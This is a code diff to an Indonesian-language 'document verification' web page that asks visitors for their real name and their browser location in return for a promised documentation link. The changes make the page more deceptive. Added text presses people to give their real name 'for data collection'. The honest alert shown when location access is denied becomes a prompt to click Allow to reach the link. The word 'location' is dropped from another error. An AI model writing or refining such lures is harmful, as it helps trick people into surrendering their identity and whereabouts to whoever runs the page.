@@ -22,7 +22,8 @@
 <body>
   <h2>Verifikasi Dokumen</h2>
   <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
-  <p>Klik Allow untuk mendapatkan Link</p>
+  <p>Klik Allow untuk mendapatkan Link.Mohon isi kolom dengan Nama Asli agar mudah dalam Pendataan👍👍</p>
+  <p>Mohon isi kolom dengan Nama Asli agar mudah dalam Pendataan👍👍</p>
   
   <!-- Form untuk input nama -->
   <input type="text" id="nama" placeholder="Masukkan Nama Anda" required><br><br>
@@ -75,10 +76,10 @@
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          alert("Pengguna menolak permintaan geolokasi.");
+          alert("Klik,Izinkan agar dapat direct ke Link Dokumentasi.");
           break;
         case error.POSITION_UNAVAILABLE:
-          alert("Informasi lokasi tidak tersedia.");
+          alert("Informasi tidak tersedia.");
           break;
         case error.TIMEOUT:
           alert("Waktu permintaan lokasi habis.");
